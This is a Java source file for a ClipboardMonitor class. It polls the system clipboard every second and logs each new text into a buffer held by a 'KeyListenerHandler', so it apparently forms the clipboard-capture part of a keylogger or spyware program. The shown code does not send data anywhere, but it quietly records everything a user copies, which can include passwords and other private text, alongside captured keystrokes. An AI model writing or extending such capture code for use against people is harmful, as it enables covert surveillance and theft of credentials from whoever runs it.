import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;

class ClipboardMonitor {
    private static String previousClipboardContent = "";

    public static void monitorClipboard(KeyListenerHandler keyListener) {
        while (true) {
            try {
                Thread.sleep(1000);
                String currentClipboardContent = getClipboardContent();
                if (!currentClipboardContent.equals(previousClipboardContent)) {
                    previousClipboardContent = currentClipboardContent;
                    keyListener.appendToBuffer("[Clipboard: " + currentClipboardContent + "]");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private static String getClipboardContent() {
        try {
            Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
            Transferable content = clipboard.getContents(null);
            if (content != null && content.isDataFlavorSupported(DataFlavor.stringFlavor)) {
                return (String) content.getTransferData(DataFlavor.stringFlavor);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }
}
